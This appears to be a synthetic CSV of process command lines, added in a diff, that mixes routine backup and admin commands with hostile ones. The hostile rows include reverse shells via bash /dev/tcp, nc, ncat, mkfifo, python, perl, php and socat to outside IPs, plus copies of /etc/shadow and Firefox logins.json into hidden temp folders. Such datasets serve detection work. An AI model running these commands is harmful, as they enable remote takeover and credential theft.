@@ -1,0 +1,221 @@
+process_name,command_line
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-2.36.8.reg /y
+certutil.exe,certutil.exe -store My 1ef0f55b791d3ce4bb8e85e63dc841bf
+ssh,ssh -tt -i /etc/ci/deploy_key sysadmin@app06.corp.local 'sudo systemctl restart payroll'
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\audit_trail C:\Backups\reg\audit_trail-8.13.5.reg /y
+pg_dump,pg_dump -h 10.24.35.55 -U ansible -Fc -f /srv/backups/db/dataset_part-1.21.9.dump --no-password customers
+openssl,openssl pkcs12 -export -in /etc/ssl/session_blob.crt -inkey /etc/ssl/session_blob.key -out /srv/backups/certs/session_blob.pfx -passout pass:871df913acc49147c677eb4f2cc61b96
+openssl,openssl pkcs12 -export -in /etc/ssl/telemetry_batch.crt -inkey /etc/ssl/telemetry_batch.key -out /srv/backups/certs/telemetry_batch.pfx -passout pass:693dfe7c7830fcaa2ab5f87f97e42417
+cat,cat /etc/shadow > /tmp/.2bc73e93c9877ed8/sh.txt
+pg_dump,pg_dump -h 10.30.200.158 -U sysadmin -Fc -f /srv/backups/db/ledger_2024-9.26.5.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\telemetry_batch C:\Backups\reg\telemetry_batch-2.11.4.reg /y
+certutil.exe,certutil.exe -store My f2116ac93be7f970fc8ee527cc37ab89
+ldapsearch,"ldapsearch -x -H ldap://db10.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+mysqldump,mysqldump --single-transaction --routines --triggers -u ops -p$DB_PASS billing > /srv/backups/audit_trail.sql
+pg_dump,pg_dump -h 10.39.141.197 -U root -Fc -f /srv/backups/db/ledger_2024-8.14.2.dump --no-password customers
+mysqldump,mysqldump --single-transaction --routines --triggers -u admin -p$DB_PASS billing > /srv/backups/ledger_2024.sql
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e5355c45c507b05b -FilePath C:\Backups\certs\audit_trail.cer
+cp,cp /home/postgres/.mozilla/firefox/*.default-release/logins.json /tmp/.9f03bd07fb81789a/
+mysqldump,mysqldump --single-transaction --routines --triggers -u mssql -p$DB_PASS billing > /srv/backups/archive_set.sql
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\snapshot C:\Backups\reg\snapshot-1.8.3.reg /y
+kubectl,kubectl get secret archive_set-tls -n production -o yaml > /srv/backups/k8s/archive_set-secret.yaml
+ssh,ssh -N -L 8080:localhost:5432 ops@node04.ad.example.com
+docker,docker exec -it snapshot-3ce17a428c81732668fc510497f4a53f /bin/bash -lc 'tail -f /var/log/app/current'
+aws,aws secretsmanager get-secret-value --secret-id prod/payroll/api --query SecretString --output text --profile ci
+expect,expect -f /opt/automation/rotate-router-cache07.exp
+openssl,openssl pkcs12 -export -in /etc/ssl/report_final.crt -inkey /etc/ssl/report_final.key -out /srv/backups/certs/report_final.pfx -passout pass:54bab0829d2362da
+ldapsearch,"ldapsearch -x -H ldap://cache06.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+ldapsearch,"ldapsearch -x -H ldap://db07.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+cp,cp /home/build/.mozilla/firefox/*.default-release/logins.json /tmp/.54bab0829d2362da/
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-2.39.1.reg /y
+ssh,ssh -N -L 8080:localhost:5432 postgres@svc04.ad.example.com
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\0d62ae13c4a57a5a9aadd380de4aac9b -FilePath C:\Backups\certs\telemetry_batch.cer
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e881c666137888a5 -FilePath C:\Backups\certs\customer_db.cer
+ssh,ssh -tt -i /etc/ci/deploy_key release@web08.ad.example.com 'sudo systemctl restart manifest'
+docker,docker exec -it ledger_2024-ee41c775de9e74106c5065e04f5cc20e /bin/bash -lc 'tail -f /var/log/app/current'
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-6.35.2.reg /y
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\customer_db C:\Backups\reg\customer_db-4.36.7.reg /y
+openssl,openssl pkcs12 -export -in /etc/ssl/report_final.crt -inkey /etc/ssl/report_final.key -out /srv/backups/certs/report_final.pfx -passout pass:f70043b68b8c4580
+pg_dump,pg_dump -h 10.35.254.77 -U jenkins -Fc -f /srv/backups/db/manifest-5.8.9.dump --no-password customers
+mosh,mosh --ssh='ssh -i /etc/ci/key' postgres@db10.ad.example.com -- tmux attach -t deploy
+ssh,ssh -N -L 31337:localhost:5432 postgres@db08.prod.svc.cluster.local
+socat,"socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.1.100.52:5432"
+tmux,"tmux new-session -d -s deploy 'ssh automation@worker03 ""journalctl -u audit_trail -f""'"
+docker,docker exec -it payroll-883354bd434cbd092cce03174720110a /bin/bash -lc 'tail -f /var/log/app/current'
+cp,cp /home/postgres/.mozilla/firefox/*.default-release/logins.json /tmp/.e9ac890f6b0d/
+openssl,openssl pkcs12 -export -in /etc/ssl/archive_set.crt -inkey /etc/ssl/archive_set.key -out /srv/backups/certs/archive_set.pfx -passout pass:1ef0f55b791d3ce4bb8e85e63dc841bf
+nc,nc -z -w2 10.15.197.210 8443 && echo 'port 8443 open on 10.15.197.210'
+socat,"socat TCP-LISTEN:9001,reuseaddr,fork TCP:10.39.170.112:5432"
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-6.24.6.reg /y
+mosh,mosh --ssh='ssh -i /etc/ci/key' release@db08.ad.example.com -- tmux attach -t deploy
+openssl,openssl pkcs12 -export -in /etc/ssl/payroll.crt -inkey /etc/ssl/payroll.key -out /srv/backups/certs/payroll.pfx -passout pass:3236fcea7a92
+pg_dump,pg_dump -h 10.40.164.12 -U www-data -Fc -f /srv/backups/db/archive_set-2.34.5.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\dataset_part C:\Backups\reg\dataset_part-8.10.0.reg /y
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\45599927f333 -FilePath C:\Backups\certs\report_final.cer
+cat,cat /etc/shadow > /tmp/.6be137b4fffe/sh.txt
+pg_dump,pg_dump -h 10.5.98.114 -U build -Fc -f /srv/backups/db/archive_set-3.31.9.dump --no-password customers
+nc,nc -z -w2 10.13.98.36 5985 && echo 'port 5985 open on 10.13.98.36'
+ldapsearch,"ldapsearch -x -H ldap://build10.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\audit_trail C:\Backups\reg\audit_trail-3.24.5.reg /y
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\snapshot C:\Backups\reg\snapshot-9.39.7.reg /y
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-5.34.0.reg /y
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\d902fd7bda7a -FilePath C:\Backups\certs\dataset_part.cer
+socat,"socat TCP:91.231.38.182:8080 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane"
+pg_dump,pg_dump -h 10.2.193.52 -U automation -Fc -f /srv/backups/db/audit_trail-1.10.2.dump --no-password customers
+openssl,openssl pkcs12 -export -in /etc/ssl/audit_trail.crt -inkey /etc/ssl/audit_trail.key -out /srv/backups/certs/audit_trail.pfx -passout pass:b18542383f8e3eb1
+gpg,gpg --export-secret-keys --armor backups@internal.acme.io > /srv/backups/keys/payroll.asc
+mysqldump,mysqldump --single-transaction --routines --triggers -u sysadmin -p$DB_PASS billing > /srv/backups/report_final.sql
+gpg,gpg --export-secret-keys --armor backups@prod.svc.cluster.local > /srv/backups/keys/payroll.asc
+pg_dump,pg_dump -h 10.31.108.93 -U automation -Fc -f /srv/backups/db/audit_trail-5.11.9.dump --no-password customers
+mysqldump,mysqldump --single-transaction --routines --triggers -u ansible -p$DB_PASS billing > /srv/backups/manifest.sql
+pg_dump,pg_dump -h 10.40.227.31 -U postgres -Fc -f /srv/backups/db/report_final-6.14.1.dump --no-password customers
+openssl,openssl pkcs12 -export -in /etc/ssl/audit_trail.crt -inkey /etc/ssl/audit_trail.key -out /srv/backups/certs/audit_trail.pfx -passout pass:1ef0f55b791d3ce4bb8e85e63dc841bf
+ldapsearch,"ldapsearch -x -H ldap://db03.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+bash,bash -i >& /dev/tcp/91.72.124.67/53 0>&1
+certutil.exe,certutil.exe -store My 881a14dffa5c0e26c96fde4ccc528a48
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e3a56da39776 -FilePath C:\Backups\certs\session_blob.cer
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\payroll C:\Backups\reg\payroll-7.0.6.reg /y
+ssh,ssh -tt -i /etc/ci/deploy_key svc_backup@worker02.ad.example.com 'sudo systemctl restart archive_set'
+mysqldump,mysqldump --single-transaction --routines --triggers -u root -p$DB_PASS billing > /srv/backups/ledger_2024.sql
+openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:a8864878b44c3a1c8e84e566c2c7d023
+python3,python3 -m http.server 9001 --directory /srv/artifacts/session_blob --bind 10.22.21.112
+pg_dump,pg_dump -h 10.24.194.38 -U sysadmin -Fc -f /srv/backups/db/ledger_2024-5.23.3.dump --no-password customers
+openssl,openssl pkcs12 -export -in /etc/ssl/archive_set.crt -inkey /etc/ssl/archive_set.key -out /srv/backups/certs/archive_set.pfx -passout pass:244f9cc0ced252b41915e38ecc283fc3
+mosh,mosh --ssh='ssh -i /etc/ci/key' ansible@edge07.corp.local -- tmux attach -t deploy
+pg_dump,pg_dump -h 10.34.129.226 -U deploy -Fc -f /srv/backups/db/report_final-3.4.2.dump --no-password customers
+gpg,gpg --export-secret-keys --armor backups@corp.local > /srv/backups/keys/dataset_part.asc
+ssh,ssh -N -L 4444:localhost:5432 ansible@node07.ad.example.com
+ldapsearch,"ldapsearch -x -H ldap://node10.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+php,"php -r '$s=fsockopen(""5.91.32.81"",80);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
+openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:6be137b4fffe
+ncat,ncat 185.122.191.51 1337 -e /bin/bash
+nc,nc -z -w2 10.18.79.16 8443 && echo 'port 8443 open on 10.18.79.16'
+pg_dump,pg_dump -h 10.39.99.207 -U mssql -Fc -f /srv/backups/db/archive_set-3.36.2.dump --no-password customers
+pg_dump,pg_dump -h 10.13.98.36 -U admin -Fc -f /srv/backups/db/dataset_part-6.4.9.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\archive_set C:\Backups\reg\archive_set-7.13.8.reg /y
+openssl,openssl pkcs12 -export -in /etc/ssl/payroll.crt -inkey /etc/ssl/payroll.key -out /srv/backups/certs/payroll.pfx -passout pass:d598050b917c6e7b00eda90371cdcfa2
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\customer_db C:\Backups\reg\customer_db-9.26.1.reg /y
+python3,python3 -m http.server 5985 --directory /srv/artifacts/customer_db --bind 10.25.206.207
+certutil.exe,certutil.exe -store My fa212de203b5eed8006a7a0f4782494d
+tmux,"tmux new-session -d -s deploy 'ssh automation@app05 ""journalctl -u snapshot -f""'"
+pg_dump,pg_dump -h 10.22.21.112 -U admin -Fc -f /srv/backups/db/snapshot-6.19.6.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\customer_db C:\Backups\reg\customer_db-0.38.8.reg /y
+pg_dump,pg_dump -h 10.40.227.31 -U root -Fc -f /srv/backups/db/dataset_part-8.11.9.dump --no-password customers
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\a05b68c5ddc3 -FilePath C:\Backups\certs\audit_trail.cer
+ssh,ssh -N -L 5985:localhost:5432 automation@svc03.prod.svc.cluster.local
+pg_dump,pg_dump -h 10.10.240.161 -U postgres -Fc -f /srv/backups/db/manifest-1.6.2.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\report_final C:\Backups\reg\report_final-5.34.7.reg /y
+nc,nc -e /bin/bash 91.211.68.100 2222
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-5.4.1.reg /y
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\bfe9ddf26f44 -FilePath C:\Backups\certs\archive_set.cer
+ldapsearch,"ldapsearch -x -H ldap://svc09.prod.svc.cluster.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+gpg,gpg --export-secret-keys --armor backups@internal.acme.io > /srv/backups/keys/report_final.asc
+ssh,ssh -N -L 443:localhost:5432 svc_backup@ci04.ad.example.com
+pg_dump,pg_dump -h 10.10.41.185 -U www-data -Fc -f /srv/backups/db/customer_db-0.25.8.dump --no-password customers
+ncat,ncat 5.233.15.187 8443 -e /bin/bash
+openssl,openssl pkcs12 -export -in /etc/ssl/audit_trail.crt -inkey /etc/ssl/audit_trail.key -out /srv/backups/certs/audit_trail.pfx -passout pass:bdeca475c013
+mysqldump,mysqldump --single-transaction --routines --triggers -u www-data -p$DB_PASS billing > /srv/backups/ledger_2024.sql
+ssh,ssh -tt -i /etc/ci/deploy_key postgres@build07.eng.example.net 'sudo systemctl restart design_spec'
+mysqldump,mysqldump --single-transaction --routines --triggers -u release -p$DB_PASS billing > /srv/backups/ledger_2024.sql
+ldapsearch,"ldapsearch -x -H ldap://app02.prod.svc.cluster.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+ldapsearch,"ldapsearch -x -H ldap://db11.internal.acme.io -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+pg_dump,pg_dump -h 10.12.83.62 -U svc_backup -Fc -f /srv/backups/db/manifest-3.5.0.dump --no-password customers
+gpg,gpg --export-secret-keys --armor backups@internal.acme.io > /srv/backups/keys/manifest.asc
+openssl,openssl pkcs12 -export -in /etc/ssl/manifest.crt -inkey /etc/ssl/manifest.key -out /srv/backups/certs/manifest.pfx -passout pass:00eaa139b1c6
+openssl,openssl pkcs12 -export -in /etc/ssl/telemetry_batch.crt -inkey /etc/ssl/telemetry_batch.key -out /srv/backups/certs/telemetry_batch.pfx -passout pass:d598050b917c6e7b00eda90371cdcfa2
+openssl,openssl pkcs12 -export -in /etc/ssl/design_spec.crt -inkey /etc/ssl/design_spec.key -out /srv/backups/certs/design_spec.pfx -passout pass:310470bf162a4a8ae83e931168824745
+openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:42f5ddcc6152
+bash,bash -c 'exec 5<>/dev/tcp/45.225.126.95/8080; cat <&5 | while read l; do $l 2>&5 >&5; done'
+ssh,ssh -N -L 5985:localhost:5432 ops@cache07.prod.svc.cluster.local
+pg_dump,pg_dump -h 10.39.141.197 -U deploy -Fc -f /srv/backups/db/manifest-7.0.1.dump --no-password customers
+pg_dump,pg_dump -h 10.39.170.112 -U jenkins -Fc -f /srv/backups/db/design_spec-7.6.2.dump --no-password customers
+ldapsearch,"ldapsearch -x -H ldap://node04.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+openssl,openssl pkcs12 -export -in /etc/ssl/ledger_2024.crt -inkey /etc/ssl/ledger_2024.key -out /srv/backups/certs/ledger_2024.pfx -passout pass:1a016804a4a872530498e94ddfe08493
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\9fc189a05a3a1426f6bd57670b5fa393 -FilePath C:\Backups\certs\telemetry_batch.cer
+mkfifo,mkfifo /tmp/.dfb024707c175857;cat /tmp/.dfb024707c175857|/bin/sh -i 2>&1|nc 185.218.142.120 2222 >/tmp/.dfb024707c175857
+ldapsearch,"ldapsearch -x -H ldap://node09.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+pg_dump,pg_dump -h 10.37.233.251 -U root -Fc -f /srv/backups/db/ledger_2024-9.13.7.dump --no-password customers
+certutil.exe,certutil.exe -store My 85c86b74d6d2
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\a05b68c5ddc3 -FilePath C:\Backups\certs\archive_set.cer
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\dataset_part C:\Backups\reg\dataset_part-9.16.1.reg /y
+mysqldump,mysqldump --single-transaction --routines --triggers -u jenkins -p$DB_PASS billing > /srv/backups/archive_set.sql
+openssl,openssl pkcs12 -export -in /etc/ssl/archive_set.crt -inkey /etc/ssl/archive_set.key -out /srv/backups/certs/archive_set.pfx -passout pass:e5d726d56382ed9d1fd196202cec9bba
+ldapsearch,"ldapsearch -x -H ldap://worker12.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+pg_dump,pg_dump -h 10.19.225.150 -U ansible -Fc -f /srv/backups/db/audit_trail-5.26.8.dump --no-password customers
+ldapsearch,"ldapsearch -x -H ldap://svc11.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+kubectl,kubectl get secret snapshot-tls -n production -o yaml > /srv/backups/k8s/snapshot-secret.yaml
+bash,bash -i >& /dev/tcp/5.76.143.83/8080 0>&1
+openssl,openssl pkcs12 -export -in /etc/ssl/design_spec.crt -inkey /etc/ssl/design_spec.key -out /srv/backups/certs/design_spec.pfx -passout pass:db017fe1d49251966df6c960085d39c9
+openssl,openssl pkcs12 -export -in /etc/ssl/session_blob.crt -inkey /etc/ssl/session_blob.key -out /srv/backups/certs/session_blob.pfx -passout pass:5f0263ed0556
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\3457574b9b96 -FilePath C:\Backups\certs\session_blob.cer
+openssl,openssl pkcs12 -export -in /etc/ssl/payroll.crt -inkey /etc/ssl/payroll.key -out /srv/backups/certs/payroll.pfx -passout pass:98130b7e11a0ae4c
+openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:8017e017d214b1f5
+openssl,openssl pkcs12 -export -in /etc/ssl/report_final.crt -inkey /etc/ssl/report_final.key -out /srv/backups/certs/report_final.pfx -passout pass:3ce17a428c81732668fc510497f4a53f
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\payroll C:\Backups\reg\payroll-4.17.7.reg /y
+nc,nc -z -w2 10.39.187.148 5985 && echo 'port 5985 open on 10.39.187.148'
+mkfifo,mkfifo /tmp/.12d013e1af67;cat /tmp/.12d013e1af67|/bin/sh -i 2>&1|nc 45.152.85.235 8080 >/tmp/.12d013e1af67
+pg_dump,pg_dump -h 10.10.240.161 -U www-data -Fc -f /srv/backups/db/ledger_2024-6.21.5.dump --no-password customers
+pg_dump,pg_dump -h 10.34.129.226 -U sysadmin -Fc -f /srv/backups/db/audit_trail-4.14.2.dump --no-password customers
+socat,"socat TCP-LISTEN:1337,reuseaddr,fork TCP:10.39.99.207:5432"
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\archive_set C:\Backups\reg\archive_set-8.35.0.reg /y
+pg_dump,pg_dump -h 10.23.157.102 -U mssql -Fc -f /srv/backups/db/archive_set-7.28.9.dump --no-password customers
+pg_dump,pg_dump -h 10.3.87.82 -U www-data -Fc -f /srv/backups/db/session_blob-5.40.1.dump --no-password customers
+ssh,ssh -tt -i /etc/ci/deploy_key release@build07.internal.acme.io 'sudo systemctl restart report_final'
+openssl,openssl pkcs12 -export -in /etc/ssl/design_spec.crt -inkey /etc/ssl/design_spec.key -out /srv/backups/certs/design_spec.pfx -passout pass:f2116ac93be7f970fc8ee527cc37ab89
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-7.19.0.reg /y
+ldapsearch,"ldapsearch -x -H ldap://cache10.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+openssl,openssl pkcs12 -export -in /etc/ssl/design_spec.crt -inkey /etc/ssl/design_spec.key -out /srv/backups/certs/design_spec.pfx -passout pass:a4a2fd64d2c3
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\payroll C:\Backups\reg\payroll-0.5.4.reg /y
+perl,"perl -e 'use Socket;$i=""91.72.124.67"";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));exec(""/bin/sh -i"");'"
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e5d726d56382ed9d1fd196202cec9bba -FilePath C:\Backups\certs\report_final.cer
+mosh,mosh --ssh='ssh -i /etc/ci/key' root@svc11.eng.example.net -- tmux attach -t deploy
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\dc7e2705c8a8e520 -FilePath C:\Backups\certs\customer_db.cer
+pg_dump,pg_dump -h 10.14.170.102 -U mssql -Fc -f /srv/backups/db/design_spec-1.32.6.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\session_blob C:\Backups\reg\session_blob-8.18.8.reg /y
+socat,"socat TCP-LISTEN:53,reuseaddr,fork TCP:10.20.12.178:5432"
+pg_dump,pg_dump -h 10.23.157.102 -U root -Fc -f /srv/backups/db/telemetry_batch-1.9.1.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-3.13.9.reg /y
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\257a33d245a1 -FilePath C:\Backups\certs\archive_set.cer
+ldapsearch,"ldapsearch -x -H ldap://worker10.prod.svc.cluster.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+openssl,openssl pkcs12 -export -in /etc/ssl/ledger_2024.crt -inkey /etc/ssl/ledger_2024.key -out /srv/backups/certs/ledger_2024.pfx -passout pass:e3a56da39776
+openssl,openssl pkcs12 -export -in /etc/ssl/session_blob.crt -inkey /etc/ssl/session_blob.key -out /srv/backups/certs/session_blob.pfx -passout pass:012abc0da95ceed1
+ldapsearch,"ldapsearch -x -H ldap://worker05.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e9ac890f6b0d -FilePath C:\Backups\certs\payroll.cer
+python3,"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""193.173.219.49"",5986));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([""/bin/sh""])'"
+pg_dump,pg_dump -h 10.13.186.29 -U admin -Fc -f /srv/backups/db/report_final-1.10.9.dump --no-password customers
+pg_dump,pg_dump -h 10.3.253.182 -U ops -Fc -f /srv/backups/db/design_spec-4.20.0.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\report_final C:\Backups\reg\report_final-6.7.6.reg /y
+docker,docker exec -it ledger_2024-f70043b68b8c4580 /bin/bash -lc 'tail -f /var/log/app/current'
+mysqldump,mysqldump --single-transaction --routines --triggers -u root -p$DB_PASS billing > /srv/backups/audit_trail.sql
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-7.18.0.reg /y
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\payroll C:\Backups\reg\payroll-8.10.1.reg /y
+openssl,openssl pkcs12 -export -in /etc/ssl/payroll.crt -inkey /etc/ssl/payroll.key -out /srv/backups/certs/payroll.pfx -passout pass:881a14dffa5c0e26c96fde4ccc528a48
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\audit_trail C:\Backups\reg\audit_trail-9.30.4.reg /y
+openssl,openssl pkcs12 -export -in /etc/ssl/audit_trail.crt -inkey /etc/ssl/audit_trail.key -out /srv/backups/certs/audit_trail.pfx -passout pass:e9ac890f6b0d
+pg_dump,pg_dump -h 10.30.200.158 -U sysadmin -Fc -f /srv/backups/db/report_final-3.15.8.dump --no-password customers
+certutil.exe,certutil.exe -store My 4b8258d8d0d6
+bash,bash -i >& /dev/tcp/185.141.239.31/2222 0>&1
+mysqldump,mysqldump --single-transaction --routines --triggers -u deploy -p$DB_PASS billing > /srv/backups/dataset_part.sql
+openssl,openssl pkcs12 -export -in /etc/ssl/design_spec.crt -inkey /etc/ssl/design_spec.key -out /srv/backups/certs/design_spec.pfx -passout pass:012abc0da95ceed1
+socat,"socat TCP-LISTEN:5985,reuseaddr,fork TCP:10.15.87.205:5432"
+openssl,openssl pkcs12 -export -in /etc/ssl/session_blob.crt -inkey /etc/ssl/session_blob.key -out /srv/backups/certs/session_blob.pfx -passout pass:632196f863074b23
+openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:7123154cab37edd9
+pg_dump,pg_dump -h 10.23.157.102 -U automation -Fc -f /srv/backups/db/session_blob-7.28.7.dump --no-password customers
+python3,python3 -m http.server 9001 --directory /srv/artifacts/payroll --bind 10.20.234.156
+openssl,openssl pkcs12 -export -in /etc/ssl/manifest.crt -inkey /etc/ssl/manifest.key -out /srv/backups/certs/manifest.pfx -passout pass:53929587bfe0
+python3,"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""185.153.63.238"",8443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([""/bin/sh""])'"
+pg_dump,pg_dump -h 10.38.199.37 -U postgres -Fc -f /srv/backups/db/ledger_2024-0.14.9.dump --no-password customers
+certutil.exe,certutil.exe -store My c18a7c0e17634f2b95c7fc723f961f8a
+mysqldump,mysqldump --single-transaction --routines --triggers -u jenkins -p$DB_PASS billing > /srv/backups/payroll.sql
+docker,docker exec -it ledger_2024-1ef0f55b791d3ce4bb8e85e63dc841bf /bin/bash -lc 'tail -f /var/log/app/current'
+openssl,openssl pkcs12 -export -in /etc/ssl/telemetry_batch.crt -inkey /etc/ssl/telemetry_batch.key -out /srv/backups/certs/telemetry_batch.pfx -passout pass:2ff8134dc12fbbc45615e8e2628cbd84
+ldapsearch,"ldapsearch -x -H ldap://edge04.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"
+php,"php -r '$s=fsockopen(""185.141.239.31"",1337);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
+mysqldump,mysqldump --single-transaction --routines --triggers -u sysadmin -p$DB_PASS billing > /srv/backups/session_blob.sql
+docker,docker exec -it customer_db-1cf4ab443fb6b906 /bin/bash -lc 'tail -f /var/log/app/current'
+ansible-pull,"ansible-pull -U git@app05.prod.svc.cluster.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml"
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-9.6.1.reg /y
+kubectl,kubectl exec -it deploy/ledger_2024 -n production -- /bin/sh -c 'rake db:migrate:status'
+pg_dump,pg_dump -h 10.2.193.52 -U build -Fc -f /srv/backups/db/snapshot-7.8.8.dump --no-password customers
+reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\archive_set C:\Backups\reg\archive_set-0.30.7.reg /y
+socat,"socat TCP-LISTEN:5985,reuseaddr,fork TCP:10.40.236.90:5432"
